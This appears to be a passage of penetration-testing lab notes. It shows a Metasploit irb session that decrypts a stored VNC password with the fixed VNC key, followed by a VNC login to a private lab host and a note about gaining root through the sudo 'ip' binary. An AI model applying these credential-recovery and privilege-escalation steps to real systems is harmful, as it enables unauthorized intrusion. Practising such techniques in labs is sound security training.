2. decryt it - https://discord.com/channels/780824470113615893/1087927556604432424/1247782220375134280

msf6 > rib
[-] Unknown command: rib
msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
=> "\x17Rk\x06#NX\a"
>> require 'rex/proto/rfb'
=> true
>> Rex::Proto::RFB::Cipher.decrypt ["BFE825DE515A335BE3"].pack('H*'), fixedkey
=> "R3S3+rcH"
>> exit
```

2. VNC login 
```
vncviewer 10.10.124.10:5901
Connected to RFB server, using protocol version 3.8
Performing standard VNC authentication
Password: 
Authentication successful
Desktop name "rd:1 (research)"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
```

3. Rooted with SUDO 'ip' binary. 



From here next one is 14 which is in another subnet so, I stopped here. 